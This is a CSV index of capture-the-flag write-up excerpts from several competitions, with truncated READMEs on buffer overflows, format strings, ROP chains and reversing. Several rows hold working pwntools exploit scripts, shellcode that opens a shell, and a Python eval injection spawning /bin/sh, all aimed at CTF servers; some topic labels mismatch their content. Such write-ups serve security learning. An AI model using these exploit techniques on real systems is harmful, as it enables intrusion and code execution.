dataset,identifier,repo,relative_path,title,topic,excerpt
ctf_writeup,writeups-58,writeups,b01lers-ctf-2020/pwn/black_hole/jaiverma/README.md,jaiverma,buffer_overflow,"[](ctf=b01lers-ctf-2020) [](type=pwm) [](tags=buffer-overflow,rop) [](tools=ropgadget,gdb,python) # black hole We are given a [binary](../black-hole) with a stack-based buffer overflow. The buffer-overflow can be turned into an arbitrary write by overwriting a variable on the stack which is used as the offset to the input buffer. User input is read 1 byte at a time using repeated calls to `read` until a newline character `\n` is encountered. ![](./ida.png) By overwriting the offset variable on the stack, we can overwrite the saved return address and build a ROP chain. I had so much trouble with alignment and testing this because I was running `Arch linux` and the server was running `Ubuntu 18.04`. The solver script is [here](./solve.py). ``` $ python solve.py ... Throttle: 3 Gravity: 17 O => | > $ d You lose aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc0! Sorry, you died! You win, ./flag.txt! pctf{th1s_l1ttle_man0uver_just_c0st_us_51_y34r5} /home/black-hole/black-hole.sh: line 2: 2802 Segmentation fault (core dumped) ./black-hole [*] Got EOF while reading in interactive $ [*] Interrupt"
ctf_writeup,writeups-59,writeups,b01lers-ctf-2020/pwn/jumprive/jaiverma/README.md,jaiverma,format_string,"[](ctf=b01lers-ctf-2020) [](type=pwn) [](tags=format-string) [](tools=python) # jumpdrive The given [binary](../jumpdrive) has a format string vulnerability. The flag is stored on the stack. Using the format string vulnerability, we can leak the stack and get the flag. Solver script is [here](./solve.py). ```sh python solve.py [+] Opening connection to pwn.ctf.b01lers.com on port 1002: Done [+] Opening connection to pwn.ctf.b01lers.com on port 1002: Done [+] Opening connection to pwn.ctf.b01lers.com on port 1002: Done [+] Opening connection to pwn.ctf.b01lers.com on port 1002: Done b'pctf{pr1nTf_1z_4_St4R_m4p}\n\x00?\x7f\x00' ```"
ctf_writeup,writeups-60,writeups,b01lers-ctf-2020/reverse/train_arms/jaiverma/README.md,jaiverma,other,"[](ctf=b01lers-ctf-2020) [](type=reversing) [](tags=arm) [](tools=python) # train arms We are given an `ARM` assembly [source file](../main.s) and a [text file](result.txt) The source is simple enough and we can write a python script to give us the flag. ```asm .cpu cortex-m0 .thumb .syntax unified .fpu softvfp .data flag: .string ""REDACTED"" //len = 28 .text .global main main: ldr r0,=flag eors r1,r1 eors r2,r2 movs r7,#1 movs r6,#42 loop: ldrb r2,[r0,r1] cmp r2,#0 beq exit lsls r3,r1,#0 ands r3,r7 cmp r3,#0 bne f1//if odd strb r2,[r0,r1] adds r1,#1 b loop f1: eors r2,r6 strb r2,[r0,r1] adds r1,#1 b loop exit: wfi ``` Running the [solver script](./solve.py) gives us the flag. ```sh $ python solve.py b'pctf{tr41ns_d0nt_h4v3_arms}\x00' ```"
ctf_writeup,writeups-61,writeups,b01lers-ctf-2020/reverse/dank_engine/jaiverma/README.md,jaiverma,other,"[](ctf=b01lers-ctf-2020) [](type=reversing) [](tags=game,re,godot) [](toosl=ghidra) # dank engine We are given a [zip file](../DankEngine.zip). This consists of: - DankEngine.pck - DankEngine.x86\_64 `DankEngine.x86_64` is a game written with the Godot game engine. Running `strings` on the `.pck` file, we can see that there is functionality to enable `God Mode` in the game. ``` 169 func zero_evt_release(): 170 self.g_cheat_stack.push_back(""0"") 171 if self.g_cheat_stack == [""P"", ""U"", ""R"", ""G"", ""0"", ""0""]: 172 self.g_god_mode = not self.g_god_mode 173 $CollisionShape2D.disabled = not $CollisionShape2D.disabled ``` All we have to do is enter 'PURG00' and then we can move arbitrarily in the game map and travel through walls. After travelling to the far-right in the map, we can see an image consisting of the flag. ![](./flag.png) Flag: `pctf{itwastimeforthomastogo_hehadseeneverything}`"
ctf_writeup,writeups-62,writeups,b01lers-ctf-2020/reverse/chugga_chugga/jaiverma/README.md,jaiverma,other,"[](ctf=b01lers-ctf-2020) [](type=reversing) [](tags=z3,angr) [](tools=z3) # chugga chugga We are given a [binary](../chugga) which has been written in `Go`. The `Go` binary which consists of a set of constraints that we can reverse and model with an SMT solver like `Z3`. We just have to find the function where the core logic lies and not waste our time with all the bloat that Go adds. The `main.main` function at `0x492eb0` is responsible for checking our input. Ghidra decompiler makes it easy for us to model the constraints: ```c void main.main(void) { undefined **ppuVar1; char cVar2; char cVar3; char *pcVar4; char *pcVar5; char **ppcVar6; char cVar7; byte bVar8; long in_FS_OFFSET; char **local_a0; undefined *local_28; undefined1 *local_20; undefined *local_18; char **local_10; ppcVar6 = local_a0; ppuVar1 = (undefined **)(*(long *)(in_FS_OFFSET + 0xfffffff8) + 0x10); if (&local_28 < *ppuVar1 || &local_28 == (undefined **)*ppuVar1) { runtime.morestack_noctxt(); main.main(); return; } runtime.newobject(); while( true ) { runtime.convT64(); local_28 = &DAT_004a4c40; local_20 = main.statictmp_2; local_18 = &DAT_004a4480; local_10 = local_a0; fmt.Fprintln(); fmt.Fprintln(); local_a0 = o"
ctf_writeup,writeups-63,writeups,Backdoor-CTF/pwn/worst-pwn-ever/abishek/README.md,abishek,command_injection,"## Worst Pwn Ever (Pwn) We get netcat connection parameters to work with. After connecting to the server we get a custom command-line prompt, but typing some random things cause the connection to close. Some fuzzing lead us to typing `1+()` which crashes with a nice python exception that we can't add int to a tuple. This means that our input has to be evaluated by python interpreter. We use this to run: ```python __import__(""pty"").spawn(""/bin/sh"") ``` To get a real shell on the target machine. After that we tried the standard aproach with `find flag` but it gave us nothing. Fortunately we came back to task description which stated that the admin is `environmentalist` and so we typed `set` to see evn variables and there was a variable named `_F_L_AG` containing the flag itself. "
ctf_writeup,writeups-64,writeups,Backdoor-CTF/rev/Debug/abishek/README.md,abishek,command_injection,"***DEBUG32*** *category:reverse engineering* *points:70* When the given binary was analysed it was found to be a 32-bit,stripped file. ```bash hulkbuster@Jarvis:~/Downloads$ file debug32 debug32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=46b87dea3b50c74ec8cde885ccc9a4d9e5e260f3, stripped ``` Opening the file with IDA,Analyxing the code flow, it is found that there exists a funtion that ""prints flag"". Now setting a random break point at an address then changing the pointer EIP to the above function's address prints the flag. ```bash gdb-peda$ file debug32 Reading symbols from debug32...(no debugging symbols found)...done. gdb-peda$ break *0x080483a0 Breakpoint 1 at 0x80483a0 gdb-peda$ r Starting program: /home/hulkbuster/Downloads/debug32 [----------------------------------registers-----------------------------------] EAX: 0xf7ffd938 --> 0x0 EBX: 0xf7ffd000 --> 0x22f08 ECX: 0x0 EDX: 0xf7fe91d0 (push ebp) ESI: 0xffffd7ec --> 0xffffd9b3 (""XDG_VTNR=2"") EDI: 0x80483a0 (xor ebp,ebp) EBP: 0x0 ESP: 0xffffd7e0 --> 0x1 EIP: 0x80483a0 (xor ebp,ebp) EFLAGS: 0x282 (carry parity adjust zero SI"
ctf_writeup,writeups-65,writeups,Backdoor-CTF/rev/Debug/abishek/files/README.md,files,other,The image and binary for the challenge is found here.
ctf_writeup,writeups-66,writeups,Backdoor-CTF/stego/loseless/abishek/README.md,abishek,other,"***LOSELESS*** *category:steganography* *points:100* In this challenge, we are provided with two images, `original.png` and `encrypted.png`. And are supposed to find the hidden message. Observing the images and seeing the difference using `compare original.png encrypted.png diff.png` reveals that both the images differ only in the top right corner. ![bump](files/diff.png) It was only a matter of seconds that we realized these may be binary strings Blue - 1 and Black - 0. Moreover, they were of 7 bits (Vertically). That further provoked the thought of them fitting in ASCII representation. (<128) We wrote a quick script to read the binary numbers and got the output `The flag is SHA256{-----------------------------}`. TEAM BYTEBANDITS"
ctf_writeup,writeups-67,writeups,tu-ctf-2018/pwn/timber/jaiverma/README.md,jaiverma,buffer_overflow,"[](ctf=tu-ctf-2018) [](type=pwn) [](tags=rop) [](tools=radare2,gdb-peda,pwntools,python) # Timber We are given a [binary](../timber) with a stack canary, a stack based buffer overflow and a format string vulnerability. The binary mimics the popular dating application Tinder! ```bash vagrant@amy:~/share/timber$ file timber timber: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5f25b2cc724fad9767439392ba05ac91177ae3ee, not stripped ``` ```bash vagrant@amy:~/share/timber$ ./timber Welcome to Timber™! The world's largest lumberjack dating site Please enter your name: jack Alright jack Let's find you a match! Options: l: Swipe Left r: Swipe Right s: Super Swipe Eastern Pine age 4183? l American Elm age 502? r American Beech age 796? s +Match Found! ----------------- American Beech ---------------- [American Beech] So, are you a tree hugger or what. hello [American Beech] Pff, lumberjacks are all the same. ``` The format string vulnerability can be used to leak the stack canary allowing us to exploit the binary with a ROP chain. ```python from pwn import * context(arch='i386', os='linux') #"
ctf_writeup,writeups-68,writeups,tu-ctf-2018/pwn/lisa/jaiverma/README.md,jaiverma,buffer_overflow,"[](ctf=tu-ctf-2018) [](type=pwn) [](tags=rop) [](tools=radare2,gdb-peda,pwntools,python) # Lisa We are given a [binary](../lisa) which leaks a heap address and has a stack based buffer overflow allowing us to overwrite at most 1 byte of the saved return address. ```bash vagrant@amy:~/share/lisa$ file lisa lisa: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=7f2cd300a5518deec5cb00e27dae466022fdacd9, not stripped ``` `PIE` and `NX` enabled. ```bash gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : ENABLED RELRO : Partial ``` With these constraints, we can jump to the following locations: ```assembly ... │ 0x00000d01 8d8340000000 lea eax, [ebx + 0x40] ; ""4"" ; '@' │ 0x00000d07 8b10 mov edx, dword [eax] │ 0x00000d09 8d8348000000 lea eax, [ebx + 0x48] ; 'H' │ 0x00000d0f 8b00 mov eax, dword [eax] │ 0x00000d11 6a2b push 0x2b ; '+' ; size_t nbyte │ 0x00000d13 52 push edx ; void *buf │ 0x00000d14 50 push eax ; int fildes │ 0x00000d15 e836f8ffff call sym.imp.read ; ssize_t read(int fildes, void *buf, size_t nbyte) │ 0x00000d1a 83c40c add esp, 0xc │ 0x00000d1d e89cfaff"
ctf_writeup,writeups-69,writeups,tu-ctf-2018/pwn/ehh/jaiverma/README.md,jaiverma,format_string,"[](ctf=tu-ctf-2018) [](type=pwn) [](tags=stack-canary) [](tools=radare2,gdb-peda,pwntools,python) # Ehh We are given a [binary](../ehh) which prints out the address of a variable and accepts user input. ```bash vagrant@amy:~/share/ehh$ file ehh ehh: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d50965fb2cafc7eb26ecbce94385e870a05d02eb, not stripped ``` The binary has a format string vulnerability which can be leveraged to overwrite the variable such that the constaint is satisfied. ```assembly ... │ 0x000006f6 8b8328000000 mov eax, dword [ebx + 0x28] ; [0x28:4]=0x200034 ; '(' │ 0x000006fc 83f818 cmp eax, 0x18 │ ┌─< 0x000006ff 7512 jne 0x713 │ │ 0x00000701 83ec0c sub esp, 0xc │ │ 0x00000704 8d83d2e7ffff lea eax, [ebx - 0x182e] │ │ 0x0000070a 50 push eax ; const char *string │ │ 0x0000070b e8b0fdffff call sym.imp.system ; int system(const char *string) │ │ 0x00000710 83c410 add esp, 0x10 │ └─> 0x00000713 b800000000 mov eax, 0 ... ``` Exploit: ```python from pwn import * context(arch='i386', os='linux') # p = process('./ehh') p = remote('18.222.213.102', 12345) p.recvuntil('here< ') "
ctf_writeup,writeups-70,writeups,tu-ctf-2018/pwn/shella-easy/jaiverma/README.md,jaiverma,buffer_overflow,"[](ctf=tu-ctf-2018) [](type=pwn) [](tags=buffer-overflow) [](tools=radare2,gdb-peda,pwntools,python) # Shella Easy We are given a [binary](../shella-easy) without any exploit mitigations. ```bash vagrant@amy:~/share/shella_easy$ file shella-easy shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped ``` ```bash gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : disabled PIE : disabled RELRO : Partial ``` The program has a call to `gets` and thus is a vanilla stack based buffer overflow. Exploitation allows us to get the flag from the server. ```python from pwn import * context(arch='i386', os='linux') # p = process('./shella') p = remote('52.15.182.55', 12345) p.recvuntil(""Yeah I'll have a "") leak = p.recvuntil(' ').strip() leak = int(leak, 16) shellcode = asm(shellcraft.i386.sh()) shellcode = shellcode.ljust(64, '\x90') shellcode += p32(0xdeadbeef) shellcode += 'a' * 8 shellcode += p32(leak) p.send(shellcode) p.interactive() ``` Flag > TUCTF{1_607_4_fl46_bu7_n0_fr135}"
ctf_writeup,writeups-71,writeups,tu-ctf-2018/pwn/canary/jaiverma/README.md,jaiverma,other,"[](ctf=tu-ctf-2018) [](type=pwn) [](tags=stack-canary) [](tools=radare2,gdb-peda,pwntools,python) # canary We are given a [binary](../canary) which accepts user input and has a custom stack canary implementation. ```assembly [0x0804860b]> pdf @sym.initCanary ┌ (fcn) sym.initCanary 87 │ sym.initCanary (void *s); │ ; arg void *s @ ebp+0x8 │ ; CALL XREF from sym.doCanary (0x80486e9) │ 0x0804860b 55 push ebp │ 0x0804860c 89e5 mov ebp, esp │ 0x0804860e 6a28 push 0x28 ; '(' ; 40 ; size_t n │ 0x08048610 6a00 push 0 ; int c │ 0x08048612 ff7508 push dword [s] ; void *s │ 0x08048615 e8d6feffff call sym.imp.memset ; void *memset(void *s, int c, size_t n) │ 0x0804861a 83c40c add esp, 0xc │ 0x0804861d 8b4508 mov eax, dword [s] ; [0x8:4]=-1 ; 8 │ 0x08048620 8d5028 lea edx, [eax + 0x28] ; '(' ; 40 │ 0x08048623 a140a00408 mov eax, dword obj.devrand ; [0x804a040:4]=-1 │ 0x08048628 6a04 push 4 ; 4 ; size_t nbyte │ 0x0804862a 52 push edx ; void *buf │ 0x0804862b 50 push eax ; int fildes │ 0x0804862c e81ffeffff call sym.imp.read ; ssize_t read(int fildes, void *buf, size_t nbyte) │ 0x08048631 83c40c add esp, 0xc │ 0x08048634 8b156ca00408 mov edx, dword [obj.nextind] ; [0x804a06c:4]=0 │ 0x0804863a 8b45"
ctf_writeup,writeups-72,writeups,tu-ctf-2018/pwn/shella-hard/jaiverma/README.md,jaiverma,buffer_overflow,"[](ctf=tu-ctf-2018) [](type=pwn) [](tags=stack-pivot,buffer-overflow,rop) [](tools=radare2,gdb-peda,pwntools,python) # Shella Hard We are given a [binary](../shella-hard) with `NX` enabled and a stack based buffer overflow. ```bash vagrant@amy:~/share/shella_hard$ file shella-hard shella-hard: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4bf12a273afc940e93699d77a19496b781e88246, not stripped ``` ```bash gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial ``` The binary has `execve` in the binary's GOT which allows us to easily create a ROP chain to get a shell. ```bash vagrant@amy:~/share/shella_hard$ objdump -R shella-hard shella-hard: file format elf32-i386 DYNAMIC RELOCATION RECORDS OFFSET TYPE VALUE 08049ffc R_386_GLOB_DAT __gmon_start__ 0804a00c R_386_JUMP_SLOT read@GLIBC_2.0 0804a010 R_386_JUMP_SLOT __libc_start_main@GLIBC_2.0 0804a014 R_386_JUMP_SLOT execve@GLIBC_2.0 ``` The initial read is too small for a ROP chain and therefore we have to retun to `read` and write our ROP chain using a stack pivot. Any 'rw-' section of the bin"
ctf_writeup,writeups-73,writeups,tu-ctf-2018/reverse/yeahright/jaiverma/README.md,jaiverma,other,"[](ctf=tu-ctf-2018) [](type=reversing) [](tags=malloc,memcpy) [](tools=radare2,gdb-peda) # yeahright We are given a [binary](../yeahright) which accepts user input and does a memcmp with a string. ```bash vagrant@amy:~/share/yeahright$ file yeahright yeahright: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0b6d0cc001d9c9c8fb8e1e61f8b082bcda503669, not stripped ``` ```assembly gdb-peda$ c Continuing. *Ahem*... password? aaaa [----------------------------------registers-----------------------------------] RAX: 0x555555756010 --> 0xa61616161 ('aaaa\n') RBX: 0x0 RCX: 0x555555554a98 (""7h3_m057_53cr37357_p455w0rd_y0u_3v3r_54w"") RDX: 0x28 ('(') RSI: 0x555555554a98 (""7h3_m057_53cr37357_p455w0rd_y0u_3v3r_54w"") RDI: 0x555555756010 --> 0xa61616161 ('aaaa\n') RBP: 0x7fffffffe0f0 --> 0x555555554a10 (<__libc_csu_init>: push r15) RSP: 0x7fffffffe0e0 --> 0x7fffffffe1d0 --> 0x1 RIP: 0x5555555549cf (<main+143>: call 0x5555555547c0 <memcmp@plt>) R8 : 0x7ffff7fec700 (0x00007ffff7fec700) R9 : 0x14 R10: 0x37b R11: 0x246 R12: 0x555555554810 (<_start>: xor ebp,ebp) R13: 0x7fffffffe1d0 --> 0x1 R14: 0x"
ctf_writeup,writeups-74,writeups,tu-ctf-2018/reverse/danger-zone/jaiverma/README.md,jaiverma,other,"[](ctf=tu-ctf-2018) [](type=reversing) [](tags=python,pyc) [](tools=uncompyle6,python) # Danger Zone We are given a python bytecode [file](../dangerzone.pyc). We can decompile it with **uncompyle6**. ```bash vagrant@amy:~/share/Danger Zone$ uncompyle6 dangerzone.pyc # uncompyle6 version 3.2.4 # Python bytecode 2.7 (62211) # Decompiled from: Python 2.7.10 (default, Oct 6 2017, 22:29:07) # [GCC 4.2.1 Compatible Apple LLVM 9.0.0 (clang-900.0.31)] # Embedded file name: ./dangerzone.py # Compiled at: 2018-11-22 12:44:11 import base64 def reverse(s): return s[::-1] def b32decode(s): return base64.b32decode(s) def reversePigLatin(s): return s[-1] + s[:-1] def rot13(s): return s.decode('rot13') def main(): print 'Something Something Danger Zone' return '=YR2XYRGQJ6KWZENQZXGTQFGZ3XCXZUM33UOEIBJ' if __name__ == '__main__': s = main() print s # okay decompiling dangerzone.pyc ``` The flag can be found by calling each of these functions successively after `main`. ```python import dangerzone as dz s = dz.main() s = dz.reverse(s) s = dz.b32decode(s) s = dz.reversePigLatin(s) s = dz.rot13(s) print s ``` ```bash vagrant@amy:~/share/Danger Zone$ python exploit.py Something Something Danger Zone TUC"
ctf_writeup,writeups-75,writeups,tu-ctf-2018/reverse/shoop/jaiverma/README.md,jaiverma,format_string,"[](ctf=tu-ctf-2018) [](type=reversing) [](tags=malloc,memcpy) [](tools=radare2,gdb-peda) # Shoop We are given a [binary](../shoop) which accepts user input and validates it before printing the flag. ```bash vagrant@amy:~/share/shoop$ file shoop shoop: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2569da7d2c1014488a9a5fad953f7e6d1791125e, not stripped ``` The disassembly can be viewed using a disassembler like `radare2`. ```assembly [0x00000990]> pdf ┌ (fcn) main 518 ... │ ┌─< 0x00000a4b eb29 jmp 0xa76 │ │ ; CODE XREF from main (0xa7a) │ ┌──> 0x00000a4d 8b45f0 mov eax, dword [nbyte] │ ╎│ 0x00000a50 2b45fc sub eax, dword [local_4h] │ ╎│ 0x00000a53 4898 cdqe │ ╎│ 0x00000a55 488d50ff lea rdx, [rax - 1] │ ╎│ 0x00000a59 488b45e0 mov rax, qword [s2] │ ╎│ 0x00000a5d 4801c2 add rdx, rax ; '#' │ ╎│ 0x00000a60 8b45fc mov eax, dword [local_4h] │ ╎│ 0x00000a63 4863c8 movsxd rcx, eax │ ╎│ 0x00000a66 488b45e8 mov rax, qword [buf] │ ╎│ 0x00000a6a 4801c8 add rax, rcx ; '&' │ ╎│ 0x00000a6d 0fb600 movzx eax, byte [rax] │ ╎│ 0x00000a70 8802 mov byte [rdx], al │ ╎│ 0x00000a72 836dfc01 sub dword [l"
ctf_writeup,writeups-76,writeups,tu-ctf-2016/pwn/bby-s-first-elf/kumar_abd/README.md,kumar_abd,buffer_overflow,"**BBY'S FIRST ELF** *category*:pwn *points*:25 This is a basic Buffer overflow problem. The first step checking the file type, we get a 32-bit, non-stripped Binary file. ```bash hulkbuster@Jarvis:~/Downloads$ file 3d726802521a9ce2b24e2c3baf039915e48ad056 3d726802521a9ce2b24e2c3baf039915e48ad056: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=3fb9014d549efe4ce761146b736590eb9f7e281d, not stripped``` ``` We first debug the binary using GDB debugger. When overflowed look for EBP and ESP to determine the stack size. We then checked for raw symbols of this object file. It is found a function ""print_flag"" with a memory address 0x0804856d. ```bash hulkbuster@Jarvis:~/Downloads$ nm 3d726802521a9ce2b24e2c3baf039915e48ad056 0804a034 B __bss_start 0804a044 b completed.6591 0804a02c D __data_start 0804a02c W data_start 080484b0 deregister_tm_clones 08048520 t __do_global_dtors_aux 08049f0c t __do_global_dtors_aux_fini_array_entry 0804a030 __dso_handle 08049f14 d _DYNAMIC 0804a034 D _edata 0804a048 B _end U fclose@@GLIBC_2.1 U fflush@@GLIBC_2.0 fgets@@GLIBC_2.0 08048684 T _fini U fopen@@GLIBC_2.1 08048698 R _f"
ctf_writeup,writeups-77,writeups,tu-ctf-2016/pwn/especiallygoodjmps/sudhackar/README.md,sudhackar,buffer_overflow,"[](ctf=tu-ctf-2016) [](type=exploit) [](tags=buffer overflow) [](tools=libc-database) [](techniques=ret2libc) # EspeciallyGoodJmps (pwn-75) ### Description >Pop a shell. >Binary is hosted at: 130.211.202.98:7575 >EDIT: >ASLR is enabled on remote server. ```bash $ file 23e4f31a5a8801a554e1066e26eb34745786f4c4 23e4f31a5a8801a554e1066e26eb34745786f4c4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=afcb1c16b8d5a795af98824aaede8fabc045d4ed, not stripped ``` ```bash $ checksec --file 23e4f31a5a8801a554e1066e26eb34745786f4c4 RELRO STACK CANARY NX PIE RPATH RUNPATH FILE Partial RELRO No canary found NX disabled No PIE No RPATH No RUNPATH 23e4f31a5a8801a554e1066e26eb34745786f4c4 ``` Running the program in gdb shows that basic buffer overflow is there. ```bash gdb-peda$ r Starting program: /tmp/23e4f31a5a8801a554e1066e26eb34745786f4c4 What's your name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA What's your favorite number? 1 Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, 1 is an odd number! Program received signal "
ctf_writeup,writeups-78,writeups,tu-ctf-2016/reverse/rev50/README.md,rev50,command_injection,"***REV 50*** *category:reverse engineering* *points:50* If we analyse the given binary file we find that it is a 32-bit LSB executable. ```bash hulkbuster@Jarvis:~/Downloads$ file e7453ba07805c6bab5a0b95f57aaeb6e70af76b1 e7453ba07805c6bab5a0b95f57aaeb6e70af76b1: ELF 32-bit LSB executable, MIPS, MIPS-II version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=1d5c00adcd4cbb883fea12bc860f827d023e416f, not stripped ``` Open with IDA pro. If we read the program flow starting from the main function,we arrive at point where after reading we understand that it is a XOR'ing of characters with the address **0x37**. ![bump](files/binary_ida.png) open python shell and the XOR to get the flag. ![bump](files/screen.png) TEAM BYTEBANDITS"
ctf_writeup,writeups-79,writeups,csaw-finals-2019/pwn/pwn200/sudhackar/README.md,sudhackar,rop,"[](ctf=csaw-finals-2019) [](type=reverse) [](tags=ida,brtueforce) [](tools=ida) # pwn 200 Description ``` Hello, fresh recruit. nc pwn.chal.csaw.io 1003 ``` Binary is small, x64, c++ compiled with very little features. It lets you input a buffer which can be copied to a stack buffer or compared to it. The write is not limited to size, so its very easy to overflow the stack buffer. But canaries are present on the stack. We can use the compare feature to brute force canary byte by byte. Binary has PIE enabled too, we can leak base or libc addresses too from the stack using the same technique. This will help us craft a ROP with one_gadget to achieve RCE. ```python # -*- coding: UTF-8 -*- from pwn import * context.arch = ""amd64"" # context.binary = ""/tmp/csaw/a.out"" # context.log_level = ""debug"" p = process( ""/tmp/host/csaw/a.out"", env={ ""LD_PRELOAD"": ""/tmp/host/csaw/libc-2.27.so""}) raw_input() # p = remote(""pwn.chal.csaw.io"", 1003) # g = gdb.attach(p, ""canary\n context\n vmmap\n continue"") def copy(s): p.sendline(str(2)) p.sendline(str(len(s))) p.sendline(s) def check(s): p.sendline(str(1)) p.sendline(str(len(s))) p.sendline(s) return ""found"" in p.recvline() bf = ""A"" * 9 copy(bf) """""" 0"
ctf_writeup,writeups-80,writeups,csaw-finals-2019/reverse/re200/sudhackar/README.md,sudhackar,rop,"[](ctf=csaw-finals-2019) [](type=reverse) [](tags=ida) [](tools=ida) # counting (re-200) [Binary](../counting) The flag was referenced in different functions to check one byte each. IDA xrefs did not work properly. So we just grep over the disassembly to find all 30 bytes in the flag. ```python from idautils import * from idaapi import * from idc import * from sark import * flag = [32 for i in xrange(32)] for segea in Segments(): for funcea in Functions(segea, SegEnd(segea)): functionName = GetFunctionName(funcea) print functionName f = Function(funcea) last_idx = 0 for line in f.lines: if ""cs:flag"" in line.disasm: if ""+"" in line.disasm: last_idx = int(line.disasm.split(""+"")[1].replace(""h"", """"), 16) elif ""sub cl"" in line.disasm: try: print last_idx b = int(line.disasm.split("","")[1].replace(""h"", """"), 16) flag[last_idx] = b except: pass for i, j in enumerate(""flag{""): flag[i] = ord(j) flag[30] = ord(""}"") print """".join(map(chr,flag)) ```"
ctf_writeup,writeups-81,writeups,ekoparty-ctf-2015/reversing/Patch me/sudhackar/README.md,sudhackar,command_injection,"[](ctf=ekoparty-ctf-2015) [](type=reversing) [](tags=image,C#) [](tools=Telerik-JustDecompile,PIL) [](techniques=no-patch) # Patch me (rev50) We have a [zip](../rev50.zip). Extract and we get ```bash $ file * SecureImageViewer.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows secureimage.xml: XML document text ``` .Net assembly can be very easy decompiled. I use [Telerik JustDecompile](http://www.telerik.com/products/decompiler.aspx) to decompile the code. Here is the code that does the main job of decoding the xml to an image. ```cs protected void open(object sender, EventArgs e) { int num = 201527; int[] numArray = new int[100001]; int num1 = 0; using (FileStream fileStream = File.OpenRead(""secureimage.xml"")) { numArray = (int[])(new XmlSerializer(typeof(int[]))).Deserialize(fileStream); } for (int i = 0; i < 100000; i++) { num1 = num1 + numArray[i]; } if (num1 != numArray[100000]) { MessageDialog messageDialog = new MessageDialog(null, 1, 3, 1, ""Corrupted Image"", new object[0]); messageDialog.Run(); messageDialog.Destroy(); return; } GC gC = new GC(this.graph.get_GdkWindow()); gC.set_RgbFgColor(new Color(51, 102, 153)); this.graph.get_GdkWindow().GetImage"
